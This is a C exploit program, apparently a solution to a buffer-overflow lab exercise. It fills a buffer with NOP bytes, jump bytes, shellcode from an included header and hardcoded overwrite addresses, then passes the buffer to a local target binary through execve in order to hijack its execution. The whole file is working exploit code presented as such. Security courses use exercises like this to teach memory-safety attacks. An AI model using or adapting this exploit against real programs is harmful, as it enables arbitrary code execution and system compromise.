#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define DEFAULT_BUFFER_SIZE  192
#define NOP 0x90

int main(int argc, char *argv[]) {
    char *args[3];
    char *env[1];
    char *buffer, *bufferPtr;
    int bufferSize = DEFAULT_BUFFER_SIZE;
    int i;

    // Check for command line arguments for buffer size
    if (argc > 1) {
        bufferSize = atoi(argv[1]);
    }

    // Allocate memory for buffer
    buffer = malloc(bufferSize * sizeof(char));
    if (!buffer) {
        printf("Can't allocate memory\n");
        exit(0);
    }

    // Initialize buffer with NOP
    for (i = 0; i < bufferSize; i++) {
        buffer[i] = NOP;
    }

    bufferPtr = buffer;
    
    // Define the specific byte sequences
    char *firstSequence = "\xeb\x08\x01\x01";
    for (i = 0; i < 4; i++) {
        *(bufferPtr++) = firstSequence[i];
    }

    for (i = 0; i < 4; i++) {
        *(bufferPtr++) = shellcode[i];
    }

    bufferPtr = buffer + 27;
    for (i = 0; i < strlen(shellcode); i++) {
        *(bufferPtr++) = shellcode[i];
    }

    char *secondSequence = "\x28\xee\x04\x01\x68\xfe\xa4\x40";
    for (i = 0; i < 8; i++) {
        *(bufferPtr++) = secondSequence[i];
    }
    
    buffer[bufferSize - 1] = '\0';

    // Prepare arguments for execve call
    args[0] = TARGET;
    args[1] = buffer;
    args[2] = NULL;

    env[0] = NULL;

    // Execute the target with the constructed buffer as an argument
    if (execve(TARGET, args, env) < 0) {
        fprintf(stderr, "Execve failed.\n");
    }

    return 0;
}
